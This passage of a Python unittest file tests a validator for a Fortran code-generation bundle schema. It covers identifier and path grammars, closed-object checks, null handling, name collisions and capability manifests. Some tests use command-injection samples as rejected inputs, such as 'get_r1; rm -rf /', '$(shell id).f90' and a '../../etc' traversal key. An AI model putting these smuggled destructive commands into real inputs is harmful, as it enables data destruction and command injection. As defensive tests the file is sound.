    `state_residency` outside the enum demands no capability; a `capture` outside the enum
    skips both binding couplings)."""

    def test_state_residency_enum(self) -> None:
        doc = _minimal_bundle()
        doc["target_lowering_plan"]["state_residency"] = "gpu_unicorn"
        self.assertIn("target_lowering_plan.state_residency must be one of host, device, distributed",
                      cb.validate_bundle(doc))

    def test_precision_must_be_an_object(self) -> None:
        doc = _minimal_bundle()
        doc["target_lowering_plan"]["precision"] = "gfortran -O3"
        self.assertIn("target_lowering_plan.precision must be an object", cb.validate_bundle(doc))

    def test_lowering_plan_optional_section_must_be_an_object(self) -> None:
        doc = _minimal_bundle()
        doc["target_lowering_plan"]["data_layout"] = ["soa"]
        self.assertIn("target_lowering_plan.data_layout must be an object", cb.validate_bundle(doc))

    def test_capture_enum(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"][0]["capture"] = "raw_device_pointer"
        self.assertIn("state_bindings[0].capture must be one of checks_getter, harness_registration",
                      cb.validate_bundle(doc))

    def test_state_binding_symbols_must_be_identifiers(self) -> None:
        doc = _minimal_bundle()
        doc["state_bindings"][0]["storage_symbol"] = "get_r1; rm -rf /"
        self.assertIn("state_bindings[0].storage_symbol must be an identifier",
                      cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["state_bindings"][0]["state_variable"] = "9q"
        self.assertIn("state_bindings[0].state_variable must be an identifier",
                      cb.validate_bundle(doc))

    def test_entrypoint_symbol_must_be_an_identifier(self) -> None:
        doc = _minimal_bundle()
        doc["entrypoints"][0]["symbol"] = "9 bad; rm -rf /"
        self.assertIn("entrypoints[0].symbol must be an identifier", cb.validate_bundle(doc))

    def test_identifier_length_is_capped_at_the_fortran_limit(self) -> None:
        # A symbol longer than the f2008/f2018 63-char limit cannot pass the Generate.syntax
        # compiler gate, so the bundle rejects it up front rather than deferring the failure.
        self.assertEqual(cb.FORTRAN_IDENTIFIER_MAX, 63)
        at_limit = "a" + "x" * 62      # exactly 63
        over_limit = "a" + "x" * 63    # 64
        doc = _minimal_bundle()
        doc["entrypoints"][0]["symbol"] = at_limit
        self.assertEqual(cb.validate_bundle(doc), [])
        for field, path in (("symbol", ("entrypoints", 0, "symbol")),
                            ("storage_symbol", ("state_bindings", 0, "storage_symbol")),
                            ("state_variable", ("state_bindings", 0, "state_variable"))):
            with self.subTest(field=field):
                doc = _minimal_bundle()
                container, index, key = path
                doc[container][index][key] = over_limit
                self.assertTrue(any("must be an identifier" in v for v in cb.validate_bundle(doc)),
                                f"{field} of length {len(over_limit)} must be rejected")

    def test_entrypoint_kind_enum(self) -> None:
        # An ADDED entrypoint with a bogus kind: mutating the sole entrypoint would also
        # trip the member-coverage invariant, so the enum must be pinned on its own.
        doc = _minimal_bundle()
        doc["entrypoints"].append(
            {"symbol": "build_it", "kind": "build_command", "node_key": ADV,
             "defined_in": "adv1d_model.f90", "module": "adv1d_model"})
        self.assertIn("entrypoints[1].kind must be one of operation, checks_interface",
                      cb.validate_bundle(doc))

    def test_empty_content_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"][0]["content"] = ""
        self.assertIn("files[0].content must be a non-empty string", cb.validate_bundle(doc))

    def test_malformed_semantic_version_is_rejected(self) -> None:
        for version in ("1", "1.0", "1.0.0-rc1", "v1.0.0", ""):
            with self.subTest(version=version):
                doc = _minimal_bundle()
                doc["bundle_schema_version"] = version
                self.assertEqual(
                    cb.validate_bundle(doc),
                    ["bundle_schema_version must be a semantic version string (MAJOR.MINOR.PATCH)"])

    def test_shell_metacharacters_in_a_path_are_rejected_by_the_segment_grammar(self) -> None:
        # The path flows into the assembled source tree and into the build graph, so a make
        # or shell expansion in a segment is a command-injection vector at Z2 assembly.
        for path in ("$(shell id).f90", "a b;rm -rf.f90", "`id`.f90", "x&&y.f90", "*.f90"):
            with self.subTest(path=path):
                violations = cb.logical_path_violations(path, language="fortran")
                self.assertTrue(any("must match" in v for v in violations), path)

    def test_graph_strings_hold_no_shell_metacharacters(self) -> None:
        graph = cb.derive_build_graph(
            _minimal_bundle(), dependency_closure=("infrastructure/harness_fortran_cpu@0.3.0",),
            toolchain={"language": "fortran"}, host_glue_sources=("adv1d_runner.f90",))
        for unit in graph["compile_units"]:
            for value in (unit["source"], unit["object"], *unit["prerequisite_objects"]):
                self.assertNotRegex(value, r"[;&|`$*?<>(){}\s]")


class ClosedObjectTest(unittest.TestCase):
    """Every object in the document is closed. `target_lowering_plan` is the most natural
    place to smuggle a compile flag, so each nesting level is pinned separately."""

    def test_every_nesting_level_rejects_an_unknown_key(self) -> None:
        cases = [
            (lambda d: d.__setitem__("script", "x"),
             "unknown key 'script' (the object is closed)"),
            (lambda d: d["optimization_unit"].__setitem__("script", "x"),
             "optimization_unit.unknown key 'script' (the object is closed)"),
            (lambda d: d["files"][0].__setitem__("compile_command", "x"),
             "files[0].unknown key 'compile_command' (the object is closed)"),
            (lambda d: d["entrypoints"][0].__setitem__("link_command", "x"),
             "entrypoints[0].unknown key 'link_command' (the object is closed)"),
            (lambda d: d["target_lowering_plan"].__setitem__("build_command", "x"),
             "target_lowering_plan.unknown key 'build_command' (the object is closed)"),
            (lambda d: d["state_bindings"][0].__setitem__("shell", "x"),
             "state_bindings[0].unknown key 'shell' (the object is closed)"),
        ]
        for mutate, clause in cases:
            with self.subTest(clause=clause):
                doc = _minimal_bundle()
                mutate(doc)
                self.assertIn(clause, cb.validate_bundle(doc))

    def test_fusion_group_rejects_an_unknown_key(self) -> None:
        doc = _multi_node_bundle()
        doc["target_lowering_plan"]["fusion"][0]["recipe"] = "gfortran -O3"
        self.assertIn(
            "target_lowering_plan.fusion[0].unknown key 'recipe' (the object is closed)",
            cb.validate_bundle(doc))

    def test_fusion_must_be_an_array_of_objects_with_members(self) -> None:
        doc = _multi_node_bundle()
        doc["target_lowering_plan"]["fusion"] = {"members": [ADV]}
        self.assertIn("target_lowering_plan.fusion must be an array", cb.validate_bundle(doc))
        doc["target_lowering_plan"]["fusion"] = [{"members": []}]
        self.assertIn("target_lowering_plan.fusion[0].members must be a non-empty array",
                      cb.validate_bundle(doc))
        # a non-dict group must be a CLAUSE: without it the invariant layer runs against a
        # string and crashes
        doc["target_lowering_plan"]["fusion"] = ["gfortran -O3"]
        self.assertIn("target_lowering_plan.fusion[0] must be an object", cb.validate_bundle(doc))

    def test_non_object_array_entries_are_clauses_not_crashes(self) -> None:
        for key, clause in (("files", "files[0] must be an object"),
                            ("entrypoints", "entrypoints[0] must be an object"),
                            ("state_bindings", "state_bindings[0] must be an object")):
            with self.subTest(key=key):
                doc = _minimal_bundle()
                doc[key] = ["adv1d_model.f90"]
                self.assertIn(clause, cb.validate_bundle(doc))

    def test_malformed_node_key_strings_are_rejected(self) -> None:
        # A well-formed-looking but invalid node_key must not pass as "some string".
        for bad in ("garbage_not_a_node_key", "problem/adv1d", "widget/adv1d@0.1.0",
                    "problem/Adv1d@0.1.0",      # uppercase spec_id segment (canonical is lowercase)
                    "problem/adv-1d@0.1.0",     # hyphen in a spec_id segment
                    "problem/.adv1d@0.1.0",     # empty leading dot-segment
                    "problem/adv1d@"):          # empty version
            with self.subTest(node_key=bad):
                doc = _minimal_bundle()
                doc["optimization_unit"]["members"] = [bad]
                self.assertTrue(any("must be a node_key" in v for v in cb.validate_bundle(doc)),
                                bad)
        doc = _minimal_bundle()
        doc["files"][0]["member_node_key"] = "garbage"
        self.assertIn("files[0].member_node_key must be a node_key or null",
                      cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["entrypoints"][0]["node_key"] = "garbage"
        self.assertIn("entrypoints[0].node_key must be a node_key", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["state_bindings"][0]["node_key"] = "garbage"
        self.assertIn("state_bindings[0].node_key must be a node_key", cb.validate_bundle(doc))

    def test_node_key_grammar_matches_the_repository_parser(self) -> None:
        # Aligned with tools/orchestration_runtime.py:_parse_node_key_strict: a dot-separated
        # spec_id and a prerelease/short version the rest of the workflow accepts must not be
        # rejected by this contract.
        for good in ("component/adv.flux@0.1.0", "component/foo@1.0.0-rc1",
                     "problem/adv1d@1.2", "infrastructure/harness_fortran_cpu@0.3.0"):
            with self.subTest(node_key=good):
                doc = _minimal_bundle()
                doc["optimization_unit"]["members"] = [good]
                _find(doc["files"], "adv1d_model.f90")["member_node_key"] = good
                _find(doc["files"], "adv1d_checks.f90")["member_node_key"] = good
                doc["entrypoints"][0]["node_key"] = good
                doc["state_bindings"][0]["node_key"] = good
                self.assertEqual(cb.validate_bundle(doc), [])

    def test_trailing_newline_does_not_slip_past_a_grammar(self) -> None:
        # A `$`-anchored regex matches BEFORE a trailing newline, so every grammar here must
        # be applied with fullmatch. One case per pattern — otherwise a `.match` regression
        # in an untested one lets `"...\n"` through.
        self.assertTrue(cb.logical_path_violations("sub\n/x.f90", language="fortran"))
        doc = _minimal_bundle()
        doc["entrypoints"][0]["symbol"] = "adv1d__apply\n"
        self.assertIn("entrypoints[0].symbol must be an identifier", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["state_bindings"][0]["storage_symbol"] = "get_r1\n"
        self.assertIn("state_bindings[0].storage_symbol must be an identifier",
                      cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["optimization_unit"]["members"] = [ADV + "\n"]
        self.assertTrue(any("must be a node_key" in v for v in cb.validate_bundle(doc)))
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["sync_single_case@1\n"]
        self.assertTrue(any("must be a capability token" in v for v in cb.validate_bundle(doc)))
        doc = _minimal_bundle()
        doc["bundle_schema_version"] = "1.0.0\n"
        self.assertEqual(
            cb.validate_bundle(doc),
            ["bundle_schema_version must be a semantic version string (MAJOR.MINOR.PATCH)"])

    def test_unhashable_field_values_yield_clauses_not_crashes(self) -> None:
        # Each of these is the SOLE guard standing between `validate_bundle` and a
        # `TypeError: unhashable type` in the invariant layer (a dict/list used as a lookup
        # key). A gate must not crash on the input it exists to reject.
        doc = _minimal_bundle()
        doc["files"][0]["language"] = ["fortran"]
        self.assertTrue(any("language must be one of" in v for v in cb.validate_bundle(doc)))
        doc = _minimal_bundle()
        doc["entrypoints"][0]["defined_in"] = {"cmd": "sh"}
        self.assertIn("entrypoints[0].defined_in must be a non-empty string",
                      cb.validate_bundle(doc))
        doc = _multi_node_bundle()
        doc["target_lowering_plan"]["fusion"] = [{"members": [{"x": 1}]}]
        self.assertIn("target_lowering_plan.fusion[0].members[0] must be a node_key",
                      cb.validate_bundle(doc))

    def test_mixed_type_keys_yield_a_clause_not_a_crash(self) -> None:
        # TWO unknown keys of different types: with one, the clause sort never compares.
        doc = _minimal_bundle()
        doc[7] = "x"  # not reachable from json.loads, but a gate must not crash on it
        doc["script"] = "y"
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("unknown key 7" in v for v in violations))
        self.assertIn("unknown key 'script' (the object is closed)", violations)


class NullValueTest(unittest.TestCase):
    """A JSON `null` is a PRESENT value, not an absent key. A required key set to null must
    be rejected by its own type clause — being reported by neither the required-key check
    nor a sub-validator that early-returns on None is a fail-open."""

    def test_empty_required_containers_are_rejected_by_their_own_clause(self) -> None:
        # An empty array is also caught downstream (by the coverage / execution-model
        # invariants), so the clause that NAMES the defect needs its own test.
        for key, clause in (("files", "files must be a non-empty array"),
                            ("entrypoints", "entrypoints must be a non-empty array"),
                            ("capability_requirements",
                             "capability_requirements must be a non-empty array")):
            with self.subTest(key=key):
                doc = _minimal_bundle()
                doc[key] = []
                self.assertIn(clause, cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["optimization_unit"]["members"] = []
        self.assertIn("optimization_unit.members must be a non-empty array",
                      cb.validate_bundle(doc))

    def test_null_required_containers_are_rejected(self) -> None:
        expected = {
            "optimization_unit": "optimization_unit must be an object",
            "files": "files must be a non-empty array",
            "entrypoints": "entrypoints must be a non-empty array",
            "target_lowering_plan": "target_lowering_plan must be an object",
            "capability_requirements": "capability_requirements must be a non-empty array",
            "state_bindings": "state_bindings must be an array",
        }
        for key, clause in expected.items():
            with self.subTest(key=key):
                doc = _minimal_bundle()
                doc[key] = None
                self.assertIn(clause, cb.validate_bundle(doc))

    def test_all_null_bundle_is_rejected(self) -> None:
        doc = {"bundle_schema_version": "1.0.0", "optimization_unit": None, "files": None,
               "entrypoints": None, "target_lowering_plan": None, "state_bindings": None,
               "capability_requirements": None}
        self.assertEqual(len(cb.validate_bundle(doc)), 6)

    def test_null_members_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["optimization_unit"]["members"] = None
        self.assertIn("optimization_unit.members must be a non-empty array", cb.validate_bundle(doc))

    def test_null_version_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["bundle_schema_version"] = None
        self.assertEqual(
            cb.validate_bundle(doc),
            ["bundle_schema_version must be a semantic version string (MAJOR.MINOR.PATCH)"])

    def test_null_inside_a_file_entry_is_rejected(self) -> None:
        for key, clause in (("logical_path", "files[0].logical_path must be a non-empty string"),
                            ("role", "files[0].role must be one of"),
                            ("language", "files[0].language must be one of"),
                            ("content", "files[0].content must be a non-empty string")):
            with self.subTest(key=key):
                doc = _minimal_bundle()
                doc["files"][0][key] = None
                self.assertTrue(any(v.startswith(clause) for v in cb.validate_bundle(doc)))


class ObjectNameCollisionTest(unittest.TestCase):
    """Two sources deriving one object name would compile as one unit and drop the other
    from the link. Within the bundle that is a validation violation; across origins it is
    an assembly failure — and the dangerous case is a bundle file capturing the
    host-rendered glue's object."""

    def test_flattened_paths_that_collide_are_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [_file("a/b.f90", "helper", ADV), _file("a__b.f90", "helper", ADV)]
        self.assertIn(
            "files[3].logical_path 'a__b.f90' derives the same object name as 'a/b.f90'",
            cb.validate_bundle(doc))

    def test_bundle_file_cannot_capture_the_host_glue_object(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_runner.f90", "helper", ADV))
        self.assertEqual(cb.validate_bundle(doc), [])  # the bundle alone is well-formed
        with self.assertRaisesRegex(RuntimeError, "object name collision"):
            cb.derive_build_graph(doc, toolchain={}, host_glue_sources=("adv1d_runner.f90",))

    def test_bundle_file_cannot_capture_a_staged_dependency_object(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("diffuse_model.f90", "helper", ADV))
        with self.assertRaisesRegex(RuntimeError, "object name collision"):
            cb.derive_build_graph(
                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={})

    def test_a_bare_spec_id_in_the_closure_is_rejected(self) -> None:
        # dependency_closure is node_keys; a bare spec_id (the shape _dependency_closure returns)
        # would derive an empty spec_id and emit a corrupt `staged:_model.f90`.
        with self.assertRaisesRegex(RuntimeError, "must be node_keys"):
            cb.derive_build_graph(
                _minimal_bundle(), dependency_closure=("diffuse", "component/mid@0.1.0"),
                toolchain={})

    def test_bundle_module_cannot_collide_with_a_staged_dependency_module(self) -> None:
        # Even at a DISTINCT object name, a bundle file declaring a module a staged dependency
        # also defines (`<spec_id>_model`) is a Fortran module collision: two definitions
        # overwrite the dependency's .mod. Only assembly sees the closure's module names.
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_extra.f90", "helper", ADV, modules=["diffuse_model"]))
        self.assertEqual(cb.validate_bundle(doc), [])  # the bundle alone is well-formed
        with self.assertRaisesRegex(RuntimeError, "module name collision"):
            cb.derive_build_graph(
                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={})
        # case-insensitively (Fortran module names are case-insensitive)
        doc["files"][-1]["modules"] = ["DIFFUSE_MODEL"]
        with self.assertRaisesRegex(RuntimeError, "module name collision"):
            cb.derive_build_graph(
                doc, dependency_closure=("component/diffuse@0.1.0",), toolchain={})

    def test_a_member_model_module_does_not_false_collide_with_the_closure(self) -> None:
        # A member is excluded from the staged closure, so the bundle's own `<spec_id>_model`
        # module is not a staged module — no false collision.
        doc = _multi_node_bundle()  # member component/adv_flux@0.1.0 declares module adv_flux_model
        graph = cb.derive_build_graph(doc, dependency_closure=(FLUX,), toolchain={})
        self.assertIn("adv_flux_model.o", graph["link"]["objects"])

    def test_a_distinct_dep_sharing_a_member_spec_id_is_not_silently_dropped(self) -> None:
        # A dependency whose bare spec_id equals a member's but whose NODE differs (kind or
        # version) is not the absorbed member; it must not be filtered out. Its
        # `<spec_id>_model.o` basename genuinely collides with the member's, which is an
        # unsupported configuration that must surface loudly, not vanish.
        doc = _multi_node_bundle()  # member component/adv_flux@0.1.0
        with self.assertRaisesRegex(RuntimeError, "object name collision"):
            cb.derive_build_graph(
                doc, dependency_closure=("component/adv_flux@2.0.0",), toolchain={})

    def test_object_names_collide_case_insensitively(self) -> None:
        # `a/b.f90` and `A__B.f90` differ after case folding as PATHS, but their objects
        # (`a__b.o` / `A__B.o`) are one file on a case-insensitive filesystem.
        doc = _minimal_bundle()
        doc["files"] += [_file("a/b.f90", "helper", ADV), _file("A__B.f90", "helper", ADV)]
        self.assertTrue(any("derives the same object name" in v for v in cb.validate_bundle(doc)))

    def test_cross_origin_collision_is_case_insensitive(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("ADV1D_RUNNER.f90", "helper", ADV))
        with self.assertRaisesRegex(RuntimeError, "object name collision"):
            cb.derive_build_graph(doc, toolchain={}, host_glue_sources=("adv1d_runner.f90",))


class EntrypointAttributionTest(unittest.TestCase):
    """A member's published operation lives in that member's own file, and a symbol is
    published once. Without both, "every member is independently addressable" holds only
    on paper."""

    def test_entrypoint_defined_in_another_members_file_is_rejected(self) -> None:
        doc = _multi_node_bundle()
        doc["entrypoints"][0]["defined_in"] = "adv1d_model.f90"  # ADV's file, FLUX's entrypoint
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("belongs to member" in v for v in violations))

    def test_duplicate_symbol_in_one_module_is_rejected(self) -> None:
        # Two entrypoints with the same (module, symbol) are an unlinkable duplicate.
        doc = _minimal_bundle()
        doc["entrypoints"] += [
            {"symbol": "case_run", "module": "adv1d_checks", "kind": "checks_interface",
             "node_key": ADV, "defined_in": "adv1d_checks.f90"},
            {"symbol": "case_run", "module": "adv1d_checks", "kind": "checks_interface",
             "node_key": ADV, "defined_in": "adv1d_checks.f90"},
        ]
        self.assertIn("entrypoints[2].symbol 'case_run' is published more than once by module "
                      "'adv1d_checks'", cb.validate_bundle(doc))

    def test_duplicate_symbol_in_one_module_is_case_insensitive(self) -> None:
        doc = _minimal_bundle()
        doc["entrypoints"] += [
            {"symbol": "case_run", "module": "adv1d_checks", "kind": "checks_interface",
             "node_key": ADV, "defined_in": "adv1d_checks.f90"},
            {"symbol": "CASE_RUN", "module": "adv1d_checks", "kind": "checks_interface",
             "node_key": ADV, "defined_in": "adv1d_checks.f90"},
        ]
        self.assertTrue(any("published more than once by module" in v
                            for v in cb.validate_bundle(doc)))

    def test_same_symbol_in_distinct_modules_is_allowed(self) -> None:
        # Each member's checks module exports the same fixed ABI names; scoped by module they
        # are distinct procedures (`adv_flux_checks::case_run` vs `adv1d_checks::case_run`).
        doc = _multi_node_bundle()
        doc["entrypoints"] += [
            {"symbol": "case_run", "module": "adv_flux_checks", "kind": "checks_interface",
             "node_key": FLUX, "defined_in": "adv_flux_checks.f90"},
            {"symbol": "case_run", "module": "adv1d_checks", "kind": "checks_interface",
             "node_key": ADV, "defined_in": "adv1d_checks.f90"},
        ]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_checks_entrypoint_of_the_right_member_is_valid(self) -> None:
        doc = _minimal_bundle()
        doc["entrypoints"].append(
            {"symbol": "case_run", "kind": "checks_interface", "node_key": ADV,
             "defined_in": "adv1d_checks.f90", "module": "adv1d_checks"})
        self.assertEqual(cb.validate_bundle(doc), [])


class HarnessManifestValidatorTest(unittest.TestCase):
    """`harness_capability_manifest_violations` is the canonical validator the harness
    capability schema names, and the tool-side manifest data is its first input."""

    def test_the_shipped_manifest_document_is_valid(self) -> None:
        self.assertEqual(
            cb.harness_capability_manifest_violations(cb.harness_capability_manifest_document()), [])

    def test_the_manifest_document_is_byte_stable(self) -> None:
        # The manifests are frozensets: rendering them unsorted would make the document
        # hash-order-dependent as soon as one harness provides a second capability.
        multi = {"infrastructure/harness_gpu@0.1.0": frozenset(
            {"async_device_resident@1", "state_registration@1", "trusted_reductions@1"})}
        with mock.patch.dict(cb.HARNESS_CAPABILITY_MANIFESTS, multi):
            document = cb.harness_capability_manifest_document()
        entry = next(m for m in document["manifests"]
                     if m["node_key"] == "infrastructure/harness_gpu@0.1.0")
        self.assertEqual(entry["provides"], sorted(entry["provides"]))
        self.assertEqual([m["node_key"] for m in document["manifests"]],
                         sorted(m["node_key"] for m in document["manifests"]))

    def test_non_object_input_is_a_clause(self) -> None:
        self.assertEqual(cb.harness_capability_manifest_violations([]),
                         ["harness capability manifest must be a JSON object"])

    def test_unknown_capability_name_is_rejected(self) -> None:
        doc = cb.harness_capability_manifest_document()
        doc["manifests"][0]["provides"] = ["gpu_magic@1"]
        self.assertTrue(any("harness capability vocabulary" in v
                            for v in cb.harness_capability_manifest_violations(doc)))

    def test_a_non_infrastructure_node_provides_nothing(self) -> None:
        doc = cb.harness_capability_manifest_document()
        doc["manifests"][0]["node_key"] = FLUX
        self.assertTrue(any("must be an infrastructure node_key" in v
                            for v in cb.harness_capability_manifest_violations(doc)))

    def test_a_malformed_node_key_is_rejected_on_its_grammar(self) -> None:
        # The `infrastructure/` prefix alone is not the rule: the whole node_key grammar is.
        for bad in ("infrastructure/../../etc@x", "infrastructure/Harness@1",
                    "infrastructure/harness@", "infrastructure/"):
            with self.subTest(node_key=bad):
                doc = cb.harness_capability_manifest_document()
                doc["manifests"][0]["node_key"] = bad
                self.assertTrue(any("must be an infrastructure node_key" in v
                                    for v in cb.harness_capability_manifest_violations(doc)), bad)

    def test_malformed_abi_version_and_empty_manifests_are_rejected(self) -> None:
        doc = cb.harness_capability_manifest_document()
        doc["harness_capability_abi_version"] = "1"
        doc["manifests"] = []
        violations = cb.harness_capability_manifest_violations(doc)
        self.assertIn("harness_capability_abi_version must be a positive integer", violations)
        self.assertIn("manifests must be a non-empty array", violations)

    def test_a_later_abi_generation_is_rejected_not_read(self) -> None:
        # The generation is a PIN, not a floor: reading a generation-2 manifest under
        # generation-1 semantics would assume the forward compatibility the exact-token
        # match refuses.
        doc = cb.harness_capability_manifest_document()
        doc["harness_capability_abi_version"] = cb.HARNESS_CAPABILITY_ABI_VERSION + 1
        self.assertIn(
            f"harness_capability_abi_version {cb.HARNESS_CAPABILITY_ABI_VERSION + 1} is not "
            f"supported (this contract is generation {cb.HARNESS_CAPABILITY_ABI_VERSION})",
            cb.harness_capability_manifest_violations(doc))

    def test_unknown_key_is_rejected(self) -> None:
        doc = cb.harness_capability_manifest_document()
        doc["manifests"][0]["build_command"] = "make harness"
        self.assertIn("manifests[0].unknown key 'build_command' (the object is closed)",
                      cb.harness_capability_manifest_violations(doc))
        doc = cb.harness_capability_manifest_document()
        doc["install_script"] = "./setup.sh"
        self.assertIn("unknown key 'install_script' (the object is closed)",
                      cb.harness_capability_manifest_violations(doc))

    def test_abi_version_boolean_and_zero_are_rejected(self) -> None:
        for abi in (True, 0, -1, 1.0):
            with self.subTest(abi=abi):
                doc = cb.harness_capability_manifest_document()
                doc["harness_capability_abi_version"] = abi
                self.assertIn("harness_capability_abi_version must be a positive integer",
                              cb.harness_capability_manifest_violations(doc))

    def test_duplicate_node_key_and_token_are_rejected(self) -> None:
        doc = cb.harness_capability_manifest_document()
        doc["manifests"].append(dict(doc["manifests"][0]))
        self.assertTrue(any("is declared more than once" in v
                            for v in cb.harness_capability_manifest_violations(doc)))
        doc = cb.harness_capability_manifest_document()
        doc["manifests"][0]["provides"] = ["sync_single_case@1", "sync_single_case@1"]
        self.assertTrue(any("must not repeat" in v
                            for v in cb.harness_capability_manifest_violations(doc)))

    def test_empty_provides_and_non_object_entry_are_rejected(self) -> None:
        doc = cb.harness_capability_manifest_document()
        doc["manifests"][0]["provides"] = []
        self.assertIn("manifests[0].provides must be a non-empty array",
                      cb.harness_capability_manifest_violations(doc))
        doc = cb.harness_capability_manifest_document()
        doc["manifests"] = ["harness_fortran_cpu"]
        self.assertIn("manifests[0] must be an object",
                      cb.harness_capability_manifest_violations(doc))


class MultiNodeOptimizationUnitTest(unittest.TestCase):
    """Acceptance 6: an ordered multi-node unit manifest."""

    def test_two_member_unit_is_valid_and_preserves_member_order(self) -> None:
        doc = _multi_node_bundle()
        self.assertEqual(cb.validate_bundle(doc), [])
        self.assertEqual(cb.optimization_unit_members(doc), (FLUX, ADV))

    def test_graph_respects_member_order_within_a_role(self) -> None:
        doc = _multi_node_bundle()
        graph = cb.derive_build_graph(doc, toolchain={})
        self.assertEqual([unit["object"] for unit in graph["compile_units"]], [
            "unit_types.o",                         # unit-shared internal module first
            "adv_flux_model.o", "adv1d_model.o",    # models in member order
            "adv_flux_checks.o", "adv1d_checks.o",  # checks in member order
        ])

    def test_member_without_a_model_file_is_rejected(self) -> None:
        doc = _multi_node_bundle()
        doc["files"] = [entry for entry in doc["files"]
                        if entry["logical_path"] != "adv_flux_model.f90"]
        doc["entrypoints"] = [entry for entry in doc["entrypoints"]
                              if entry["defined_in"] != "adv_flux_model.f90"]
        violations = cb.validate_bundle(doc)
        self.assertIn(f"optimization_unit member {FLUX!r} has no files[] entry of role model",
                      violations)
        self.assertIn(f"optimization_unit member {FLUX!r} has no operation entrypoint", violations)

    def test_a_problem_member_has_exactly_one_operation_entrypoint(self) -> None:
        # A problem node's single published integration update path: two operations leave the
        # host with no rule to pick which one it publishes.
        doc = _minimal_bundle()  # ADV = problem/adv1d
        doc["entrypoints"].append(
            {"symbol": "adv1d__apply_alt", "kind": "operation", "node_key": ADV,
             "defined_in": "adv1d_model.f90", "module": "adv1d_model"})
        self.assertIn(
            f"optimization_unit member {ADV!r} has 2 operation entrypoints; a problem node "
            "publishes exactly one (its integration update path)",
            cb.validate_bundle(doc))

    def test_a_component_or_infrastructure_member_may_publish_several_operations(self) -> None:
        # A component / infrastructure node publishes an API of one or more operations (the
        # harness ABI is many), so the exactly-one rule must not apply to it.
        for member, mod in (("component/adv_flux@0.1.0", "adv_flux"),
                            ("infrastructure/harness_fortran_cpu@0.3.0", "harness_fortran_cpu")):
            with self.subTest(member=member):
                doc = _multi_node_bundle()
                doc["optimization_unit"]["members"] = [member]
                doc["target_lowering_plan"].pop("fusion", None)
                sid = member.split("/", 1)[1].split("@", 1)[0]
                doc["files"] = [
                    _file(f"{sid}_model.f90", "model", member, modules=[f"{sid}_model"]),
                    _file(f"{sid}_checks.f90", "checks", member, modules=[f"{sid}_checks"]),
                ]
                doc["entrypoints"] = [
                    {"symbol": f"{mod}__op{i}", "module": f"{sid}_model", "kind": "operation",
                     "node_key": member, "defined_in": f"{sid}_model.f90"} for i in range(3)]
                doc["state_bindings"] = []
                self.assertEqual(cb.validate_bundle(doc), [])

    def test_a_profile_member_publishes_no_operation(self) -> None:
        # A profile is consumed through its selection result, not a call, so it publishes
        # EXACTLY zero operations (phase_02_generate.md). Zero is valid; an operation entrypoint
        # is an invented callable interface the Generate contract forbids.
        profile = "profile/adv1d_default@0.1.0"
        doc = _multi_node_bundle()
        doc["optimization_unit"]["members"] = [profile]
        doc["target_lowering_plan"].pop("fusion", None)
        doc["files"] = [
            _file("adv1d_default_model.f90", "model", profile, modules=["adv1d_default_model"]),
            _file("adv1d_default_checks.f90", "checks", profile, modules=["adv1d_default_checks"]),
        ]
        doc["entrypoints"] = [
            {"symbol": "case_run", "module": "adv1d_default_checks", "kind": "checks_interface",
             "node_key": profile, "defined_in": "adv1d_default_checks.f90"}]  # no operation
        doc["state_bindings"] = []
        self.assertEqual(cb.validate_bundle(doc), [])
        # adding an operation is REJECTED (a profile publishes none)
        doc["entrypoints"].append(
            {"symbol": "adv1d_default__select", "module": "adv1d_default_model",
             "kind": "operation", "node_key": profile, "defined_in": "adv1d_default_model.f90"})
        self.assertIn(
            f"optimization_unit member {profile!r} is a profile and publishes no operation, "
            "but has 1 operation entrypoint(s)",
            cb.validate_bundle(doc))

    def test_extra_checks_interface_entrypoints_are_allowed(self) -> None:
        # Only `operation` is one-per-member; the checks surface is a fixed ABI and may have
        # several checks_interface entrypoints.
        doc = _minimal_bundle()
        for symbol in ("case_setup", "case_run"):
            doc["entrypoints"].append(
                {"symbol": symbol, "kind": "checks_interface", "node_key": ADV,
                 "defined_in": "adv1d_checks.f90", "module": "adv1d_checks"})
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_entrypoint_outside_the_unit_is_rejected(self) -> None:
        doc = _multi_node_bundle()
        doc["entrypoints"][0]["node_key"] = "component/other@0.1.0"
        self.assertTrue(any("is not a member of optimization_unit" in v
                            for v in cb.validate_bundle(doc)))

    def test_file_member_outside_the_unit_is_rejected(self) -> None:
        doc = _multi_node_bundle()
        _find(doc["files"], "adv1d_checks.f90")["member_node_key"] = "component/other@0.1.0"
        self.assertTrue(any("is not a member of optimization_unit" in v
                            for v in cb.validate_bundle(doc)))

    def test_duplicate_member_is_rejected(self) -> None:
        doc = _multi_node_bundle()
        doc["optimization_unit"]["members"] = [FLUX, ADV, FLUX]
        violations = cb.validate_bundle(doc)
        self.assertIn(f"optimization_unit.members must not repeat {FLUX!r}", violations)

    def test_fusion_group_must_stay_inside_the_unit(self) -> None:
        doc = _multi_node_bundle()
        doc["target_lowering_plan"]["fusion"] = [{"members": [FLUX, "component/other@0.1.0"]}]
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("fusion[0].members 'component/other@0.1.0' is not a member" in v
                            for v in violations))

    def test_single_member_unit_is_the_default_shape(self) -> None:
        self.assertEqual(cb.optimization_unit_members(_minimal_bundle()), (ADV,))

    def test_declared_member_order_is_the_unit_identity(self) -> None:
        # The ordered member list IS the identity (no derived unit_id), so the graph must
